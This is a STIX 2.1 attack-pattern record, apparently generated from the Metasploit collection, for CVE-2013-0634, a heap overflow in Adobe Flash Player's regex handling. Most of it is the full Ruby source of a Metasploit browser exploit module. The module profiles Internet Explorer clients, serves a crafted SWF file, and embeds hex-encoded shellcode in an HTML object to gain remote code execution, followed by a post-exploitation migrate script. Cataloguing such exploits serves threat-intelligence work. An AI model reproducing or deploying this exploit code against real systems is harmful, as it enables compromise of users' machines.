{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d4ffc632-ccc1-4aac-9873-7141e00b4f49",
    "created": "2024-08-14T16:42:15.918883Z",
    "modified": "2024-08-14T16:42:15.918888Z",
    "name": "\"Adobe Flash Player Regular Expression Heap Overflow\"",
    "description": " This module exploits a vulnerability found in the ActiveX component of Adobe Flash Player before 11.5.502.149. By supplying a specially crafted swf file with special regex value, it is possible to trigger a memory corruption, which results in remote code execution under the context of the user, as exploited in the wild in February 2013. This module has been tested successfully with Adobe Flash Player 11.5 before 11.5.502.149 on Windows XP SP3 and Windows 7 SP1 before MS13-063, since it takes advantage of a predictable SharedUserData in order to leak ntdll and bypass ASLR.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_regex_value.rb",
            "external_id": "adobe_flash_regex_value.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0634"
        },
        {
            "source_name": "reference",
            "url": "http://malwaremustdie.blogspot.ru/2013/02/cve-2013-0634-this-ladyboyle-is-not.html"
        },
        {
            "source_name": "reference",
            "url": "http://malware.dontneedcoffee.com/2013/03/cve-2013-0634-adobe-flash-player.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.fireeye.com/blog/technical/cyber-exploits/2013/02/lady-boyle-comes-to-town-with-a-new-exploit.html"
        },
        {
            "source_name": "reference",
            "url": "http://labs.alienvault.com/labs/index.php/2013/adobe-patches-two-vulnerabilities-being-exploited-in-the-wild/"
        },
        {
            "source_name": "reference",
            "url": "http://eromang.zataz.com/tag/cve-2013-0634/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Adobe Flash Player Regular Expression Heap Overflow\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in the ActiveX component of Adobe\n        Flash Player before 11.5.502.149. By supplying a specially crafted swf file\n        with special regex value, it is possible to trigger a memory corruption, which\n        results in remote code execution under the context of the user, as exploited in\n        the wild in February 2013. This module has been tested successfully with Adobe\n        Flash Player 11.5 before 11.5.502.149 on Windows XP SP3 and Windows 7 SP1 before\n        MS13-063, since it takes advantage of a predictable SharedUserData in order to\n        leak ntdll and bypass ASLR.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown',                   # malware sample\n          'Boris \"dukeBarman\" Ryutin', # msf exploit\n          'juan vazquez'               # ActionScript deobfuscation and cleaning\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-0634' ],\n          [ 'OSVDB', '89936'],\n          [ 'BID', '57787'],\n          [ 'URL', 'http://malwaremustdie.blogspot.ru/2013/02/cve-2013-0634-this-ladyboyle-is-not.html' ],\n          [ 'URL', 'http://malware.dontneedcoffee.com/2013/03/cve-2013-0634-adobe-flash-player.html' ],\n          [ 'URL', 'http://www.fireeye.com/blog/technical/cyber-exploits/2013/02/lady-boyle-comes-to-town-with-a-new-exploit.html' ],\n          [ 'URL', 'http://labs.alienvault.com/labs/index.php/2013/adobe-patches-two-vulnerabilities-being-exploited-in-the-wild/' ],\n          [ 'URL', 'http://eromang.zataz.com/tag/cve-2013-0634/' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 1024,\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n          'Retries'              => false\n        },\n      'Platform'       => 'win',\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :activex => [\n            {\n              clsid: \"{D27CDB6E-AE6D-11cf-96B8-444553540000}\",\n              method: \"LoadMovie\"\n            }\n          ],\n          :os_name => OperatingSystems::Match::WINDOWS,\n          :ua_name => Msf::HttpClients::IE,\n          :flash   => lambda { |ver| ver =~ /^11\\.5/ && ver < '11.5.502.149' }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-02-08',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status(\"Sending SWF...\")\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status(\"Sending HTML...\")\n    tag = retrieve_tag(cli, request)\n    profile = browser_profile[tag]\n    profile[:tried] = false unless profile.nil? # to allow request the swf\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    shellcode = get_payload(cli, target_info).unpack(\"H*\")[0]\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"his=<%=shellcode%>\" />\n    <param name=\"Play\" value=\"true\" />\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2013-0634\", \"exploit.swf\" )\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-08",
    "x_mitre_platforms": [
        "win'"
    ]
}